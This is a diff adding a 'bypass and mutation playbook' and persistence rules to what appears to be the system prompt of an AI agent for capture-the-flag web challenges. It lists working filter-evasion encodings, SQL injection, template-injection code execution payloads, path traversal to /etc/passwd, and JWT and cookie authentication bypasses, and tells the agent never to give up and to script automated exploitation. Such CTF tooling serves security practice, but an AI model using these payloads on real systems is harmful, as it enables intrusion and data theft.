@@ -671,20 +671,67 @@ for i in range(20):
 "
 \`\`\`
 
+## BYPASS & MUTATION PLAYBOOK
+
+When a payload is blocked or filtered, DO NOT give up. Try these bypass techniques:
+
+**Encoding ladder** (try each level):
+1. URL encoding: %27 for ', %22 for ", %3C for <
+2. Double URL encoding: %2527 for '
+3. Unicode: \\u0027 for '
+4. HTML entities: &amp;#39; for ', &amp;lt; for <
+5. Hex: 0x27 for '
+6. Null bytes: %00 between filter and payload
+
+**SQLi bypass techniques:**
+- If ' is filtered: try " or \\x27 or char(39)
+- If spaces blocked: use /**/comments or tabs (%09)
+- If UNION blocked: try UnIoN or UN/**/ION
+- If SELECT blocked: try SeLeCt or table-specific: extractvalue(), updatexml()
+- Blind SQLi: ' AND SLEEP(2)-- vs ' AND 1=1-- (compare response times)
+- Time-based: BENCHMARK(5000000,SHA1('test'))
+
+**SSTI bypass techniques:**
+- If {{ blocked: try {%25, \\x7b\\x7b, or Jinja2 alternatives like {%25 set x=7*7 %25}{%25 print(x) %25}
+- Object traversal: __class__.__mro__[1].__subclasses__() to find os.popen
+- Jinja2 RCE: {{lipsum.__globals__['os'].popen('cat /flag*').read()}}
+- Twig: {{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('cat /flag*')}}
+
+**Path traversal bypass:**
+- Double dots: ....//....//etc/passwd
+- URL encoded: ..%2f..%2f..%2fetc%2fpasswd
+- Null byte (PHP<5.3): ../../etc/passwd%00.jpg
+- Windows: ..\\..\\..\\windows\\win.ini
+
+**Auth bypass:**
+- JWT none algorithm: change alg to "none", remove signature
+- JWT secret brute force: try common secrets (secret, password, key)
+- Cookie manipulation: change user_id, is_admin, role values
+- Parameter pollution: ?admin=false&admin=true
+- HTTP verb tampering: GET vs POST vs PUT vs PATCH
+
+## ANTI-REPETITION RULES
+
+- Track what you have tried. NEVER repeat the same payload on the same endpoint.
+- Maximum 2 attempts per endpoint per technique. After 2 failures, move to the next technique.
+- If you've tried 3 different approaches on the same endpoint with no progress, SKIP IT and try other endpoints.
+- When standard payloads fail, write a CUSTOM Python script to automate variations.
+
 ## REFLECTION RULE
 
 If you have used more than half your turns without finding the flag:
-1. STOP and review what you have tried
+1. STOP and list everything you have tried (endpoints, payloads, results)
 2. List untested attack vectors
-3. Check if any partial results (errors, leaked data) hint at the right approach
-4. Adjust your strategy — try a COMPLETELY DIFFERENT approach
-5. If you found a vuln but couldn't extract the flag, focus all remaining turns on exploitation
+3. Check if any error messages or partial output hint at the right approach
+4. Switch to a COMPLETELY DIFFERENT technique
+5. If you found a vuln but couldn't extract the flag, write a Python script to automate exploitation
 
 ## Rules
 1. PLAN before attacking — list vectors, prioritize by likelihood
 2. After EVERY response, read ALL headers, cookies, and body text
 3. ALWAYS log in first if there is a login form
 4. ALWAYS chain exploits — login → escalate → extract flag
+5. NEVER repeat the same payload twice — mutate or move on
 5. On IDOR: check if results appear on DIFFERENT pages (indirect IDOR)
 6. Try at least 3 payload variations per vector before moving on
 7. When you find the flag, save it with save_finding immediately
